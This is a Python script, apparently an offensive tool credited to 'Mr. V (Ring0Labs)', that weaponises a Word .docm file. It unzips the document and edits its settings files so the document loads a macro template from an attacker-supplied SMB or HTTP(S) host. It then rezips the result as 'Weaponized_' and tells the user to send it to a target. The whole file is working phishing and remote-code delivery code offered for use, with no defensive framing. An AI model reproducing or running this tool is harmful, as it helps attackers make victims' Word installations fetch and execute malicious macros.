#!/usr/bin/python

# Macro Remote Injection - Running remote Macro Template inside DOCM. 
# Works with Python3 + Kali Linux
# Written By: Mr. V (Ring0Labs)

import sys, os
from optparse import OptionParser
from urllib.parse import urlparse

parser = OptionParser(usage="usage: %prog [options] filename\nMacro Remote Injection - Mr.V (Ring0Labs)", version="%prog 1.0")
parser.add_option("-f", "--file", dest="fileName", help="Word Document File Name, ex: myword.docm", metavar="File")
parser.add_option("-t", "--type", dest="serverType", help="Remote Server Type:\nsmb | http | https  - Default https", metavar="Type", default="https")
parser.add_option("-u", "--url", dest="macroURL", help="Remote Macro Template URL, ex: myserver.com/macro.dotm", metavar="URL")


(options, args) = parser.parse_args(sys.argv)

if not options.fileName:
    parser.error('File Name not given')
    sys.exit()

if not options.macroURL:
    parser.error('Macro URL not given')
    sys.exit()


docName = options.fileName
remoteServer = options.macroURL
url = urlparse(remoteServer)
scheme = ""

themeLocation = "swag/word/_rels/settings.xml.rels"
settingsLocation = "swag/word/settings.xml"

if options.serverType.lower() == "smb":
    scheme = "file"
else:
    scheme = options.serverType.lower()


themes_value = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="'+scheme+':////'+url.hostname+'/'+url.path+'" TargetMode="External"/></Relationships>'
settings_value = '<w:attachedTemplate r:id="rId1"/></w:settings>'


def patch(filename, old_string, new_string):
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            print('"{old_string}" not found in {filename}.'.format(**locals()))
            return

    with open(filename, 'w') as f:
        print('Changing "{old_string}" to "{new_string}" in {filename}'.format(**locals()))
        s = s.replace(old_string, new_string)
        f.write(s)
        f.close()

os.system("mkdir swag")
os.system("unzip "+docName+" -d swag/")

print("Writing to %s"%settingsLocation)
patch(settingsLocation,'</w:settings>',settings_value)

print("Writing to %s"%themeLocation)
fh = open(themeLocation,'w')
print(type(themes_value))
fh.write(themes_value)
fh.close()

os.chdir("swag")
os.system("zip -r ../Weaponized_"+docName+" *")
os.chdir("../")
os.system("rm -r swag")
print("\n\nYou are all set! Send the Weaponized_"+docName+" away!")